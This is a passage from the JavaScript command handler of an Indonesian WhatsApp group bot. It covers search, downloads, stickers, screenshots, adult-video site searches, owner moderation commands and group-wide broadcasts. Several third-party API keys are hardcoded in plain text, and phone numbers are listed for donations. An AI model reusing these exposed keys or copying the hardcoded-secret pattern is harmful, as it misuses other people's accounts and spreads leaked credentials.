				teks += `❏ *Age Rating* : ${metadata.umur_pembaca}\n`;
				teks += `❏ *Reading Direction* : ${metadata.cara_baca}\n`;
				teks += `❏ *Genres* : ${metadata.genre.join(', ')}\n`;

				// Synopsis
				teks += `❏ *Synopsis* : ${animeResult.sinopsis}\n`;

				// Chapters
				for (let chapter of animeResult.chapters) {
					teks += `❏ *Chapter* : ${chapter.chapter}\n`;
					teks += `   *Title* : ${chapter.title}\n`;
					teks += `   *Upload Date* : ${chapter.upload}\n`;
					teks += `   *URL* : ${chapter.url}\n\n`;
				}
				setReply(teks)
			}
			break;
case 'playstore':

				if (!q) return setReply(`Example: ${prefix + command} PUBG MOBILE`);


				try {
					const response = await axios.get(`https://rzky.my.id/api/search/playstore?query=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
					const results = response.data.result;

					if (results.length > 0) {
						let caption = '';

						for (const selectedResult of results) {
							caption += `❏ Nama: ${selectedResult.nama}\n❏ Developer: ${selectedResult.developer}\n❏ Rating: ${selectedResult.rate}\n❏ Download: ${selectedResult.link})\n❏ Developer's Apps: ${selectedResult.link_dev}\n\n`;
						}

						ehz.sendMessage(m.chat, {
							image: {
								url: results[0].img
							},
							caption: caption
						}, {
							quoted: m
						});
					} else {
						setReply('No app information found for the given query.');
					}
				} catch (error) {
					console.error('Error fetching app information:', error);
					setReply('Error fetching app information. Please try again later.');
				}
				break;
				

case  'gimage': case 'pin' : case 'pinterest':{
  
if (!isGroup) return onlyGroup()
	if (!isPremium && global.db.data.users[sender].limit < 2) return setReply(mess.limit) // respon ketika limit habis
	if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
	try{
	const {googleImage} = require('@bochilteam/scraper')
	googleImage(q).then(async (data) => {
	//console.log(data)
	let foto = data[Math.floor(Math.random() * data.length)]
	if(data.length == "0") return setReply("Image tidak di temukan")
	setReply(mess.wait)
	ehz.sendMedia (from, foto, m, {caption: "RangelChan\nNih kak><"})
	})
	} catch(err){
	let teks = args.join(' ')
	let res = await gis(teks, google)
	function google(error, result){
	if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
	else {
	var gugIm = result
	var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
	ehz.sendMedia (from, random, m, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
	}
	}
	}
	}
	db.data.users[sender].limit -= 2 // -1 limit
	break
			case 'shopee':
			if (!q) return setReply(`Example: ${prefix + command} tas gendong`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/shopee?apikey=${api.Lol}&query=${q}`)
			var deks = 'Shopee Search : \n'
			for (var x of data.result) {
				deks += `Name : ${x.name}\n`
				deks += `Terjual : ${x.sold}\n`
				deks += `Stock : ${x.stock}\n`
				deks += `Lokasi : ${x.shop_loc}\n`
				deks += `Link : ${x.link_produk}\n\n`
			}
			setReply(deks)
			break
        case 'ppcp': case 'couple': case ' ppcouople': {
          if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
if (!isPremium) return setReply('*khusus Premium*')
                setReply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                ehz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                ehz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break	    
        case 'pantun': {
if (!isGroup) return onlyGroup()
let zeltoria = await fetch(`https://api.lolhuman.xyz/api/random/pantun?apikey=${api.Lol}`)
let hasil = await zeltoria.json()
 setReply(`${hasil.result}`.trim())
 }
 break
 case 'dilanquote': {
if (!isGroup) return onlyGroup()
let ewe = await fetch(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${api.Lol}`)
let hasil = await ewe.json()
 setReply(`${hasil.result}`.trim())
 }
 break
case 'motivasi': {
if (!isGroup) return onlyGroup()
let zeltoria = await fetch(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${api.Lol}`)
let hasil = await zeltoria.json()
 setReply(`${hasil.result}`.trim())
 }
 break
case 'katabijak': {
if (!isGroup) return onlyGroup()
let zeltoria = await fetch(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${api.Lol}`)
let hasil = await zeltoria.json()
setReply(`${hasil.result}`.trim())
 }
 break
case 'truth': case 'dare': {
if (!isGroup) return onlyGroup()
let rangel = await fetch(`https://api.betabotz.org/api/random/${command}?apikey=2fbgCgOB`)
let hasil = await rangel.json()
 setReply(`${hasil.result}`.trim())
 }
 break
 case 'xvideos': {
if (!isPremium) return setReply(mess.only.premium)
				if (!q) return setReply(`Example: ${prefix + command} Moms`);


				try {
					const response = await axios.get(`https://rzky.my.id/api/search/xvideos?query=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
					const results = response.data.result;

					if (results.length > 0) {
						let caption = '';

						for (const selectedResult of results) {
							caption += `❏ Nama: ${selectedResult.title}\n❏ Image: ${selectedResult.thumb}\n❏ Quality: ${selectedResult.quality}\n❏ Duration: ${selectedResult.duration}\n❏ Link: ${selectedResult.url}\n\n`;
						}

						ehz.sendMessage(m.chat, {
							text: caption
						}, {
							quoted: m
						});
					} else {
						setReply('No result information found for the given query.');
					}
				} catch (error) {
					console.error('Error fetching music information:', error);
					setReply('Error fetching result information. Please try again later.');
				}
				break;
			}
 case 'xnxx': {
   if (!isPremium) return setReply(mess.only.premium)
if (!m.text.includes('.')) return;
				if (!q) return setReply(`Example: ${prefix + command} Moms`);


				try {
					const response = await axios.get(`https://rzky.my.id/api/search/xnxx?query=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
					const results = response.data.result;

					if (results.length > 0) {
						let caption = '';

						for (const selectedResult of results) {
							caption += `❏ Nama: ${selectedResult.title}\n❏ Views: ${selectedResult.views}\n❏ Quality: ${selectedResult.quality}\n❏ Duration: ${selectedResult.duration}\n❏ Link: ${selectedResult.link}\n\n`;
						}

						ehz.sendMessage(m.chat, {
							text: caption
						}, {
							quoted: m
						});
					} else {
						setReply('No result information found for the given query.');
					}
				} catch (error) {
					console.error('Error fetching xnxx information:', error);
					setReply('Error fetching result information. Please try again later.');
				}
				break;
			}
 case 'fb':

			case 'facebook':

			case 'fbdown':
				if (args.length == 0) return setReply(`Example: ${prefix + command} https://www.facebook.com/`)
				setReply(mess.wait)
				axios.get(`https://rzky.my.id/api/download/fb2?url=${q}&apikey=HC-tsy5v7WU7K3JWeB`)
					.then(({
						data
					}) => {
						var caption = `❏ Title : *${data.result.title}*\n`
						caption += `❏ Duration : *${data.result.duration}*`
						ehz.sendMessage(m.chat, {
							image: {
								url: data.result.thumbnail
							},
							caption
						}).then(() => {
							ehz.sendMessage(m.chat, {
								video: {
									url: data.result.links.hd
								},
								mimetype: 'video/mp4',
								fileName: `${data.result.title}.mp4`
							})
						})
					})
				break
 case 'leave': {
if (!isOwner) return setReply(`Khusus Owner`)
                await ehz.groupLeave(m.chat)
                await setReply(`Done Tuan✅`)
            }
            break
case 'jarak':{
if (!isGroup) return onlyGroup()
if(!q.includes("|")) return setReply("Contoh Tasik|Bandung")
let Dari = q.split("|")[0]
let Ke = q.split("|")[1]
async function jarak(dari, ke) {
  let url = `https://www.google.com/search?q=${encodeURIComponent("jarak " + dari + " ke " + ke)}&hl=id`
  let { data } = await axios(url)
  let $ = cheerio.load(data)
  let img = data.split("var s=\'")[1].split("\'")[0]
  let res = {
   result: {
    img: /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,`[1], 'base64') : '',
    desc: $("div.BNeawe.deIvCb.AP7Wnd").text()
    }
  }
  return res
}
let nana = await jarak(Dari,Ke)
let image = nana.result.img
let caption = `*Google Maps* \n\n${nana.result.desc}`
ehz.sendMessage(from,{image, caption},{quoted: m})
} 
break
case 'infocuaca':{
			if (!q) return m.reply(`Example: ${prefix + command} Tasikmalaya`)
			setReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${q}?apikey=${api.Lol}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			ehz.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
		 setReply(titttttttttt)
			}
			break
        case 'cekmember': {
  if (!m.isGroup) return setReply(mess.group)
  
  const participants = await ehz.groupMetadata(m.chat).then(metadata => metadata.participants);
  
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  setReply(replyMessage);
  break;
}


 
 case 'memeindo':
   
                setReply(mess.wait)
                ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${api.Lol}`}, caption: `sangad Cringe Kaya idup Lo🗿`}, {quoted: m})
            break


case "detectqr": {
try {
mee = await ehz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0].symbol))
} catch (err) {
setReply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case "createqr": {
const qrcode = require('qrcode')
     if (!q) return setReply(' Please include link or text!')
                let qyuer = await qrcode.toDataURL(q, { scale: 35})
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
ehz.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: m })
}
break

		case 'spotifysearch':
			if (args.length == 0) return setReply(`Example: ${prefix + command} Melukis Senja`)
			axios.get(`https://api.lolhuman.xyz/api/spotifysearch?apikey=4175022d987023a9f0a9f4b4&query=${q}`).then(({ data }) => {
				var text = ''
				for (var x of data.result) {
					text += `Title : ${x.title}\n`
					text += `Artists : ${x.artists}\n`
					text += `Duration : ${x.duration}\n`
					text += `Link : ${x.link}\n`
					text += `Preview : ${x.preview_url}\n\n\n`
				}
				setReply(text)
			})
			break
case 'ss':
case 'ssweb':{
  if (!m.text.includes('.')) return;
  if (!isPremium && global.db.data.users[sender].limit < 4) return setReply("limit mu sudah habis silahkan buylimit di owner")
if (!isGroup) return setReply("khusus grup")
if (!q) return setReply("Masukan Link")
if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Link error");
let Url = `https://api.apiflash.com/v1/urltoimage?access_key=${api.Ssweb}&url=${q}&format=png&full_page=true&no_cookie_banners=true&no_ads=true&wait_until=network_idle`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: vid.url,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image:{url: Url},caption:`${mess.success}`},{quoted:m})
.catch((err) => setReply('Server sedang error coba lagi besok'))
}
db.data.users[sender].limit -= 4
break
case 'sstablet':
case 'sstablet':{
   if (!isPremium && global.db.data.users[sender].limit < 4) return setReply("limit mu sudah habis silahkan buylimit di owner")
if (!isGroup) return setReply("khusus grup")
if (!q) return setReply("Masukan Link")
if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Link error");
let Tablet = `https://api.apiflash.com/v1/urltoimage?access_key=${api.Ssweb}&url=${q}&width=800&height=1280&quality=80&no_cookie_banners=true&no_ads=true&no_tracking=true&wait_until=network_idle`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: vid.url,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image:{url: Tablet},caption:`${mess.success}`},{quoted:m})
.catch((err) => setReply('Server sedang error coba lagi besok'))
}
db.data.users[sender].limit -= 4
break
case 'sshp':
case 'ssphone':{
   if (!isPremium && global.db.data.users[sender].limit < 4) return setReply("limit mu sudah habis silahkan buylimit di owner")
if (!isGroup) return setReply("khusus grup")
if (!q) return setReply("Masukan Link")
if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Link error");
let Ssweb = `https://api.apiflash.com/v1/urltoimage?access_key=${api.Ssweb}&url=${q}&format=png&width=480&height=800&no_cookie_banners=true&no_ads=true&wait_until=network_idle`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: vid.url,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image:{url: Ssweb},caption:`${mess.success}`},{quoted:m})
.catch((err) => setReply('Server sedang error coba lagi besok'))
}
db.data.users[sender].limit -= 4
break

//========= MENU STICKER ========//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
  
   if (!isPremium && global.db.data.users[sender].limit < 2) return setReply("limit mu sudah habis silahkan buylimit di owner")
if (!m.text.includes('.')) return;

 if (!quoted) return setReply(` reply Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ehz.sendImageAsSticker(from, media, m, { packname: global.packName, author: global.authorName })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 16) return setReply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ehz.sendVideoAsSticker(from, media, m, { packname: global.packName, author: global.author })
await fs.unlinkSync(encmedia)
} else {
setReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
db.data.users[sender].limit -= 2
break
 
   




//=================================================
case 'jadwalsholat':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Contoh : ${prefix + command} Tangerang Selatan`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=4175022d987023a9f0a9f4b4`)
.then(({ data }) => {
var text = `• Wilayah : ${data.result.wilayah}\n\n`
text += `• Tanggal : ${data.result.tanggal}\n`
text += `• Sahur : ${data.result.sahur}\n`
text += `• Imsak : ${data.result.imsak}\n`
text += `• Subuh : ${data.result.subuh}\n`
text += `• Terbit : ${data.result.terbit}\n`
text += `• Dhuha : ${data.result.dhuha}\n`
text += `• Dzuhur : ${data.result.dzuhur}\n`
text += `• Ashar : ${data.result.ashar}\n`
text += `• Maghrib : ${data.result.maghrib}\n`
text += `• Isya : ${data.result.isya}`
setReply(text)
})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
}
break
case 'speed':
    setReply(`Speed: ${latensi.toFixed(4)} Second`)
    break

case 'proses':
let reportzhir = args[0]
if (!reportzhir) return setReply(`Contoh:\n.proses panelku min`)
let dehhh = text.split('|')[0]
let text12 = `「 *Ada Pesanan Nih!* 」
*Pesanan:* ${dehhh}
*Dari:* @${sender.split('@')[0]}
Segera Diproses Agar Customer Tidak Kecewa,Dan Jangan Pernah Menipu!
Jika Sudah Ketik *.accpesanan* 62xxx`
setReply(`*「 Pesanan Diproses 」*\nPESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR KAK`)
ehz.sendMessage(owner + "@s.whatsapp.net",{image: { url: `https://telegra.ph/file/df778c74a8f0417235acf.jpg`}, caption: text12, mentionedJid:[sender], quoted: m })

break
case 'donate': case 'donasi':{
   if (!m.text.includes('.')) return;
      ehz.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'Rp',
      amount99999: 999999,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: `
      *halo saya dy_net jika ingin donasi bisa transfer ke nomer di bawah ini Ya*
      
      
*GOPAY*:085719898124
*DANA*:085719898124
*OVO*:085719898124


_JIKA E-WALLET BELUM PREMIUM BISA CHAT ADMIN MEMINTA QRIS ALL PAYMENT_

  ⏩SEKIAN DARI SAYA TERIMAKSIH  BUAT YANG SUDAH BERDONASI KE DY_NET
`,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
      break
case 'accpesanan': 
if (!isOwner && !isAdmins) return setReply()
let zhirapsn = `「 *Pesanan Datang* 」
Pesanan Anda Sudah Datang,Harap Mengirim Screenshot Dan Mengatakan Done Untuk Bukti Bahwa Pesanan Telah Diterima

*Thanks For Order*`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  ehz.sendMessage(targetNumber, {
    text: `*${zhirapsn}*`,
    mentionesJid: [sender]
  }, {
    quoted: m
  }).then(() => {
    setReply(`Acc Pesanan berhasil!`);
  }).catch(() => {
    setReply(`Gagal mengirim pesan!`);
  });

break
//======== MENU OWNER ======//
 case 'ban': {
   if (!m.text.includes('.')) return;

		if (!isOwner) return setReply(mess.only.admin)

		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ehz.updateBlockStatus(users, 'block')
		await setReply(`Done`)
	}
	break
	case 'unban': {
	  if (!m.text.includes('.')) return;
		if (!isOwner) return setReply(mess.only.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ehz.updateBlockStatus(users, 'unblock')
		await setReply(`Done`)
	}
	break
 case 'clearuser':

	if (!isOwner) return onlyOwner()

	setReply("Sukses clear all User")

	db.data.users = {}

	break 
	case 'jooxplay':
			if (args.length == 0) return setReply(`Example: ${prefix + command} Melukis Senja`)
			axios.get(`https://api.lolhuman.xyz/api/jooxplay?apikey=4175022d987023a9f0a9f4b4&query=${full_args}`).then(({ data }) => {
				var caption = `Title : ${data.result.info.song}\n`
				caption += `Artists : ${data.result.info.singer}\n`
				caption += `Duration : ${data.result.info.duration}\n`
				caption += `Album : ${data.result.info.album}\n`
				caption += `Uploaded : ${data.result.info.date}\n`
				caption += `Lirik :\n ${data.result.lirik}\n`
				ehz.sendMessage(from, { image: { url: data.result.image }, caption }).then(() => {
					ehz.sendMessage(from, { audio: { url: data.result.audio[0].link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
				})
			})
			break
case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") ||item.endsWith("opus")   )
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
	if(filteredArray.length == 0) return setReply(teks)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	setReply(teks) 
	
//	await sleep(2000)
	setReply("Menghapus file sampah...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	setReply("Berhasil menghapus semua sampah")
	 
	});
	  }
	break
 case 'restart':
   if (!m.text.includes('.')) return;
	if (!isOwner) return setReply(mess.only.owner)
	await setReply(`_Restarting ${botName}_`)
	await ehz.sendMessage(from, {text: "_Succes_"})
	await sleep(300)
	process.send('resetart') 
	break
 case 'clearsesi':{
   if (!m.text.includes('.')) return;
if (!itsMe && !isOwner) return setReply(mess.only.owner)
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan\n\n`
if(filteredArray.length == 0) return setReply(teks)     
setReply(teks) 
await sleep(2000)
setReply("Menghapus file kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
setReply("Berhasil menghapus semua kenangan di folder session")     
});

}
break
case  'addcmdprem':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	addDataId(q, "premium", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
	}
	break
	  
	  case  'delcmdprem':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("premium", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdprem':{
	  if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	  let nana = await DataId.filter(item => item.name == "premium" )
	  let teks ="List Command For Premium User\n\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`• ${toFirstCase(i)}\n`   
		}    
	   teks +=`\n• Total: ${nunu.length}\n` 
	  setReply(teks)
	  }
	  break  
 case  'addcmdlimit':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
	addDataId(q, "limit", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
	}
	break
	  
	  case  'delcmdlimit':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("limit", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdlimit':{
	  let nina = await DataId.filter(item => item.name == "limit" )
	  let teks ="List Commands For limit\n"
	  let nunu = nina[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
case  'addcmdowner':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
	addDataId(q, "commands", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
	}
	break
  case  'delcmdowner':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
	  removeDataId ("commands", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	
	  case 'listcmdowner':{
	  let nana = await DataId.filter(item => item.name == "commands" )
	  let teks ="List Commands For Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	  case 'addownerbydy':
	    if (!m.text.includes('.')) return;
if (!isOwner) return setReply(mess.owner)
if (!args[0]) return setReply(`Use ${prefix+command} number\nExample ${prefix+command}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ehz.onWhatsApp(bnnd)
if (ceknye.length == 0) return setReply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
setReply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delownerbydy':
if (!isOwner) return setReply(mess.owner)
if (!args[0]) return setReply(`Use ${prefix+command} nomor\nExample ${prefix+command} 628xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
setReply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'delprembydy':
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply(mess.owner)
if (!args[0]) return setReply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./lib/premium.json', JSON.stringify(prem))
setReply(`The Number ${ya} Has Been Removed Premium!`)
break
case "addprembydy":{
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply(mess.only.owner)
if (!args[0]) return setReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283872605023`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ehz.onWhatsApp(prrkek)
if (ceknya.length == 0) return setReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./lib/premium.json", JSON.stringify(prem))
setReply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case 'cekprem': case 'cekpremium':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
			let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
			let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
			  break
 case 'sewabot':
if (!isOwner) return setReply(`Khusus owner`)
if (!q) return setReply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await ehz.groupCreate(args.join(" "), [])
let response = await ehz.groupInviteCode(cret.id)
ehz.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${q}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${global.owner}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
setReply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
case 'ceksewa':
case  'sewacek':
if (!isGroup) return setReply(mess.only.group)
if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
setReply(sewenye)
break
case 'listsewa': {
let ordernye = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvipp = ms(i.expired - Date.now())
ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${isOwner? i.linkgc : ""}\n\n`
}
ordernye += `© ${fake1}`
setReply(ordernye)
}
break
case 'getcase': case 'ambilcase':{
  if (!isOwner) return setReply("khsus owner")
  if (!m.text.includes('.')) return;
if (!q) return setReply('nama case?')
const getCase = (q) => {
return "case " + `'${q}'` + require('fs').readFileSync("dy.js").toString().split('case \''+ q +'\'')[1].split("break")[0]+"break"
} // (?); ngambil case
setReply(getCase(q))
}
break
case 'buatsw':{
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let men = [];
for (let x of owner) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = ehz.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = ehz.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
}
setReply(`*Sukses mengirim status whatsapp ke ${owner.length} Orang Yang Ada Di database*`)
break
case 'bcgc':{
if (!isOwner && !itsMe) return setReply('husus owner')
if (!q) return setReply('Teksnya?')
let getGroups = await ehz.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if(isQuotedImage || isImage || isQuotedAudio || isVideo || isQuotedVideo) {
var alala = await ehz.downloadAndSaveMediaMessage(quoted,makeid(5))
}
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)

for (let i of anus) {
let text = `
*_Broadcast Group_*

––––––『 *MESSAGE* 』––––––

${q}

`

await sleep(1000)
let contextInfo = {
forwardingScore: 50,
isForwarded: true,
externalAdReply:{
showAdAttribution: true,
title: `tes`,
body:`bjkr`,
previewType:"PHOTO",
thumbnailUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg'
}
}
if(isQuotedImage || isImage){
ehz.sendMessage(i,{contextInfo,image:fs.readFileSync(alala),caption:text})
